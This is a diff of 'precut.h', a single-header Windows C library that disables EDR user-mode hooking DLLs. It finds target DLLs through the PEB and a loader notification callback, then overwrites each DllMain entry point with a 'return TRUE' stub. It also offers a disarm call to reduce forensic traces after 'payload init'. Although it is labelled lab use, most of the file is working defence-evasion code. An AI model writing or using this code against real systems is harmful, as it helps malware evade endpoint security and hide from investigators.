@@ -1,17 +1,14 @@
 /*
- * ========================================================================
- *  precut.h — single-header EDR hook prevention via TLS callback timing
- * ========================================================================
+ * precut.h — single-header EDR hook prevention via TLS callback timing
  *
- * Drop-in library that prevents EDR user-mode hooking DLLs from
- * initializing by stubbing their entry points before DllMain runs.
+ * Stubs EDR hooking DLL entry points before DllMain runs.
  *
  * QUICK START
  * -----------
  *   // In exactly ONE .c file:
  *   #define PRECUT_IMPLEMENTATION
  *
- *   // Define your targets (replace placeholders with real module names):
+ *   // Define your targets (replace placeholders with real names):
  *   //   PREFIX → versioned DLLs (suffix changes per agent update)
  *   //   EXACT  → fixed-name DLLs (same filename across versions)
  *   #define PRECUT_TARGETS             \
@@ -26,54 +23,33 @@
  *
  * API
  * ---
- *   void precut_arm(void)
- *       Walk PEB for already-mapped targets (Write A), then register
- *       LdrRegisterDllNotification to catch future maps (Write B).
- *       Call this from a TLS callback or any point before NtTestAlert.
- *
- *   void precut_disarm(void)
- *       Unregister the DLL load notification. Call after payload init
- *       to reduce forensic footprint.
- *
- *   void precut_set_callback(precut_stub_fn fn)
- *       Register a function called after each successful stub write.
- *       Signature: void fn(const wchar_t *name, void *base, int ok)
- *       Set to NULL to disable (default).
- *
- *   int precut_stub_count(void)
- *       Returns the number of entry points successfully stubbed so far.
+ *   precut_arm()           PEB walk (Write A) + register notification (Write B).
+ *   precut_disarm()        Unregister notification. Reduces forensic surface.
+ *   precut_set_callback(fn)  void fn(wchar_t *name, void *base, int ok)
+ *   precut_stub_count()    Entry points stubbed so far.
  *
  * TARGET MACROS
  * -------------
- *   PRECUT_PREFIX(L"prefix")   Use for versioned DLLs whose basename
- *                              includes a build number or hash that
- *                              changes across agent updates. Give only
- *                              the stable leading part. Case-insensitive
- *                              prefix match with .dll suffix guard.
- *                              "hookeng8542.dll" matches PREFIX(L"hookeng").
+ *   PRECUT_PREFIX(L"pre")     Versioned DLLs — give the stable leading part.
+ *                             Matches pre.dll, pre8542.dll, pre_v3.dll.
+ *   PRECUT_EXACT(L"x.dll")   Fixed-name DLLs — exact basename match.
  *
- *   PRECUT_EXACT(L"name.dll")  Use for fixed-name DLLs that never change
- *                              across versions. Case-insensitive exact
- *                              basename match — zero ambiguity.
+ *   Picking the wrong one:
+ *     EXACT on a versioned DLL → silently stops matching after agent update.
+ *       No crash, but EDR hooks load normally and you won't notice.
+ *     PREFIX on a fixed-name DLL → works fine, but a generic prefix like
+ *       "agent" could collide with unrelated modules and crash the process.
  *
- *   PREFIX works for both cases if the prefix is specific enough to never
- *   collide with unrelated modules. EXACT rules out accidental matches on
- *   generic prefixes. Stubbing the wrong module crashes the process.
+ *   PREFIX is the safer default for vendor-specific names. Use EXACT when
+ *   the prefix is too generic to be collision-free.
  *
  * COMPILE-TIME OPTIONS
  * --------------------
- *   PRECUT_IMPLEMENTATION      Include the implementation (one .c only).
- *   PRECUT_TLS_AUTO            Emit MSVC TLS plumbing so precut_arm()
- *                              runs automatically at process attach.
- *   PRECUT_STATIC              Make all API functions static (default
- *                              when PRECUT_TLS_AUTO is set).
+ *   PRECUT_IMPLEMENTATION   Include the implementation (one .c only).
+ *   PRECUT_TLS_AUTO         Emit MSVC TLS plumbing for auto precut_arm().
+ *   PRECUT_STATIC           All API functions static (default with TLS_AUTO).
  *
- * REQUIREMENTS
- * ------------
- *   MSVC (VS2022 v143), x64, /MT recommended. See README for why
- *   GCC/MinGW cannot produce the required TLS directory.
- *
- * Lab use only. Not production.
+ * MSVC (VS2022 v143), x64, /MT recommended. Lab use only.
  */
 
 #ifndef PRECUT_H
@@ -89,23 +65,13 @@
 extern "C" {
 #endif
 
-/* ---- Public types ---------------------------------------------------- */
-
-/* Callback invoked after each stub attempt.
- *   name  — basename of the target DLL
- *   base  — load address of the image
- *   ok    — 1 if the entry point was successfully stubbed, 0 on failure */
 typedef void (*precut_stub_fn)(const wchar_t *name, void *base, int ok);
-
-/* ---- Linkage control ------------------------------------------------- */
 
 #if defined(PRECUT_STATIC) || defined(PRECUT_TLS_AUTO)
 #define PRECUT_API static
 #else
 #define PRECUT_API
 #endif
-
-/* ---- Public API declarations ----------------------------------------- */
 
 PRECUT_API void precut_arm(void);
 PRECUT_API void precut_disarm(void);
@@ -124,14 +90,12 @@ PRECUT_API int  precut_stub_count(void);
 
 #include <winternl.h>
 
-/* ---- Default target list (placeholders — match nothing on a live system)
+/* ---- Default targets (placeholders — match nothing on a live system)
  *
  * Replace with real DLL names from your lab:
- *   PRECUT_PREFIX  → versioned DLLs (build number/hash changes per update)
- *   PRECUT_EXACT   → fixed-name DLLs (same filename across all versions)
- *
- * Add or remove entries to match what your target EDR injects.
- * --------------------------------------------------------------------- */
+ *   PREFIX → versioned DLLs (suffix changes per update)
+ *   EXACT  → fixed-name DLLs (same filename across versions)
+ * Add or remove entries freely. */
 
 #ifndef PRECUT_TARGETS
 #define PRECUT_TARGETS                         \
@@ -141,7 +105,7 @@ PRECUT_API int  precut_stub_count(void);
     PRECUT_EXACT(L"edrclient.dll")
 #endif
 
-/* ---- Undocumented loader structures ---------------------------------- */
+/* ---- Undocumented loader notification types (ntdll, no SDK header) --- */
 
 typedef struct _PRECUT_DLL_NOTIFICATION_DATA {
     ULONG           Flags;
@@ -201,6 +165,7 @@ static int precut__copy_uname(const UNICODE_STRING *u, wchar_t *out, int cap)
     return n;
 }
 
+/* Case-insensitive prefix match + ".dll" suffix guard */
 static int precut__prefix_dll(const wchar_t *name, const wchar_t *prefix)
 {
     int i = 0, n = 0;
@@ -218,6 +183,7 @@ static int precut__prefix_dll(const wchar_t *name, const wchar_t *prefix)
         && precut__fold(name[n-1]) == L'l';
 }
 
+/* Case-insensitive wide string compare; returns 0 when equal */
 static int precut__wicmp(const wchar_t *a, const wchar_t *b)
 {
     while (*a && *b) {
@@ -228,8 +194,7 @@ static int precut__wicmp(const wchar_t *a, const wchar_t *b)
     return (int)(precut__fold(*a) - precut__fold(*b));
 }
 
-/* X-macro expansion: PRECUT_TARGETS is expanded with PRECUT_PREFIX and
- * PRECUT_EXACT temporarily defined as match operations. */
+/* X-macro expansion: PRECUT_TARGETS becomes a chain of if-return checks */
 static int precut__is_target(const wchar_t *basename)
 {
 #define PRECUT_PREFIX(p) if (precut__prefix_dll(basename, p)) return 1;
@@ -242,9 +207,11 @@ static int precut__is_target(const wchar_t *basename)
 
 /* ---- Entry-point stubbing -------------------------------------------- */
 
-/* B8 01 00 00 00 C3 = mov eax, 1 / ret (DllMain returns TRUE) */
+/* B8 01 00 00 00 C3 = mov eax,1; ret — DllMain returns TRUE */
 static const BYTE precut__stub[6] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
 
+/* Validate PE headers, bounds-check RVA, skip if already stubbed,
+ * flip page to RWX for the 6-byte write, then restore protection. */
 static int precut__stub_entry(PVOID dll_base)
 {
     BYTE *base = (BYTE *)dll_base;
@@ -266,7 +233,7 @@ static int precut__stub_entry(PVOID dll_base)
 
     if (ep[0] == 0xB8 && ep[1] == 0x01 && ep[2] == 0x00 &&
         ep[3] == 0x00 && ep[4] == 0x00 && ep[5] == 0xC3)
-        return 1;  /* already stubbed — count as success */
+        return 1;  /* already stubbed */
 
     if (!VirtualProtect(ep, sizeof(precut__stub), PAGE_EXECUTE_READWRITE, &old))
         return 0;
@@ -275,7 +242,6 @@ static int precut__stub_entry(PVOID dll_base)
     return 1;
 }
 
-/* Stub + callback + counter wrapper */
 static void precut__do_stub(const wchar_t *name, PVOID base)
 {
     int ok = precut__stub_entry(base);
@@ -300,7 +266,7 @@ static void precut__peb_stub(void)
     }
 }
 
-/* ---- Write B: DLL load notification callback ------------------------- */
+/* ---- Write B: notification fires after map, before DllMain ----------- */
 
 static VOID CALLBACK precut__on_loaded(
     ULONG reason, PPRECUT_DLL_NOTIFICATION data, PVOID ctx)
@@ -314,23 +280,21 @@ static VOID CALLBACK precut__on_loaded(
     precut__do_stub(name, data->Loaded.DllBase);
 }
 
-/* ---- Public API implementation --------------------------------------- */
+/* ---- Public API ------------------------------------------------------ */
 
 PRECUT_API void precut_arm(void)
 {
     HMODULE ntdll;
     fnLdrRegisterDllNotification reg;
 
-    /* Write A: stub anything already in the loader list */
-    precut__peb_stub();
+    precut__peb_stub();  /* Write A */
 
-    /* Write B: register for future maps */
     ntdll = GetModuleHandleW(L"ntdll.dll");
     if (!ntdll) return;
     reg = (fnLdrRegisterDllNotification)GetProcAddress(
         ntdll, "LdrRegisterDllNotification");
     if (!reg) return;
-    reg(0, precut__on_loaded, NULL, &g_precut_cookie);
+    reg(0, precut__on_loaded, NULL, &g_precut_cookie);  /* arm Write B */
 }
 
 PRECUT_API void precut_disarm(void)
